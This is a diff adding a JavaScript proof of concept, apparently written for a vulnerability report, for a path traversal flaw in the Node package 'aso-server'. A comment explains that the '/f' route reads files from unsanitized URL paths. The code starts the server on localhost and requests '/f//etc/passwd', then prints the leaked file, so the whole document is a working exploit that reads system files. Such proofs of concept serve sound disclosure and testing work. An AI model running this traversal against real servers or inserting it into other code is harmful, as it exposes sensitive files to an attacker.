@@ -1,0 +1,21 @@
+```javascript
+const http = require("http");
+
+// aso-server's writeFileContents() (called from connectionHandler for the "/f" route)
+// builds a filesystem path directly from the URL and passes it straight into
+// fs.readFileSync(path) with no root-jail / sanitization. Requesting "/f/<value>"
+// with a leading empty segment ("//") yields an absolute path, giving arbitrary
+// file read from anywhere on disk.
+const server = require("aso-server");
+
+server.start("127.0.0.1", 4321, () => {
+  http.get("http://127.0.0.1:4321/f//etc/passwd", (res) => {
+    let data = "";
+    res.on("data", (chunk) => (data += chunk));
+    res.on("end", () => {
+      console.log("Leaked /etc/passwd contents:\n" + data);
+      server.stop();
+    });
+  });
+});
+```
